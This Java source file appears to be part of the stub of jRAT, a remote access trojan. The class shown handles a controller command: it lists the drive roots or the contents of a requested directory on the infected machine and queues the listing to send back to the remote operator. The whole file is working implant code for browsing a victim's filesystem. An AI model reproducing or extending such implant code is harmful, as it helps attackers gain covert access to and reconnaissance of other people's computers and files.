package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet22ListFiles;

import java.io.File;


public class Packet15ListFiles extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String current = con.readLine();

		File[] files;

		if (current.length() == 0) {
			files = File.listRoots();
		} else {
			files = new File(current).listFiles();
		}

		con.addToSendQueue(new Packet22ListFiles(files));
	}

}
